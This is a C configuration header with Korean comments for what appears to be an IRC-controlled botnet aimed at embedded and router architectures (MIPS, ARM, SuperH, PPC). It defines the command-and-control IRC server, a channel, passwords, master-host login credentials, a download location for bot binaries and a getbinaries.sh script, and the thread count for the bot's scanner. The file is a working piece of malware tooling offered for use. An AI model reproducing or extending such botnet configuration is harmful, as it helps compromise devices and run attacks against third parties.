// UTF-8 인코딩

#ifndef __CONFIG_H_
#define __CONFIG_H_

/* 백그라운드 모드 '0', 개발자 모드 '1'*/
#define background_mode 0

/* IRC 서버 문법: IP:PORT 혹은 IP:PORT|IP:PORT 형식으로 최대 10개까지 추가 가능*/
/* passproto(IRC프로토콜에서 사용하는 값), irc_passwd(서버 접근 시 비번) 변경 금지*/
#define irc_servers  "172.25.235.247:6666"
#define passproto    "PASS"
#define irc_passwd   "fuckya"

/* 서버 주소를 암호화 하는 설정이지만 사용하지 않는다. */
#define encirc 0
#define enc_servers ">.,C_>C>,C@<@U+<<<F>.,C_>C>,C@<>U+<<<F>.,C_>C>,C@<<U+<<<F>.,C_>C>,C@<_U+<<<"
#define enc_passwd  "bcdi"

/* 접속할 채널 명 */
#define irc_chan      "#HearthStone"
/* 자신이 실행되고 있는 내용에 대해서 상태를 return 해줌
 '0'=OFF '1'=ON 랙을 유발시킴. 변경 금지*/
#define all_messages  0
/* 대화방 비밀번호 설정시 비밀번호. 변경 금지 */
#define irc_chankey   "key"

/* 마스터 호스트 인증. ip주소와 비밀번호를 입력. */
/*.login에 사용하므로 기록해놓을것*/
#define master_host     "@hostname.tld"
#define master_password "psw1"

/* HTTP REFERENCE (WHERE YOU UPLOAD BINARIES AND GETBINARIES.SH) */
#define reference_http  "http://127.0.0.1"

/* NAME OF BINARIES: IF YOU CHANGE THESE VALUES, DON'T FORGET */
/* TO CHANGE TOO IN MAKEFILE AND GETBINARIES.SH               */
#define reference_mipsel   "mipsel"
#define reference_mips     "mips"
#define reference_superh   "sh"
#define reference_arm      "arm"
#define reference_ppc      "ppc"

/* NICKNAME PREFIX:                     */
/* WARNING: DO NOT CHANGE NCTYPE VALUE! */
/* NOTE: MAXTHREADS ARE FOR SCANNER,    */
/* DON'T CHANGE IF YOU DON'T KNOW WHAT  */
/* YOU ARE DOING!                       */
#ifdef MIPSEL
    #define irc_nick_prefix   "[MS]"
    #define nctype "m"
    #define maxthreads (128)
#elif MIPS
    #define irc_nick_prefix   "[M]"
    #define nctype "m"
    #define maxthreads (128)
#elif SUPERH
    #define irc_nick_prefix   "[S]"
    #define nctype "s"
    #define maxthreads (128)
#elif ARM
    #define irc_nick_prefix   "[A]"
    #define nctype "a"
    #define maxthreads (128)
#elif PPC
    #define irc_nick_prefix   "[P]"
    #define nctype "p"
    #define maxthreads (128)
#else
    #define irc_nick_prefix   "[X]"
    #define nctype "x"
    #define maxthreads (128)
#endif

#endif
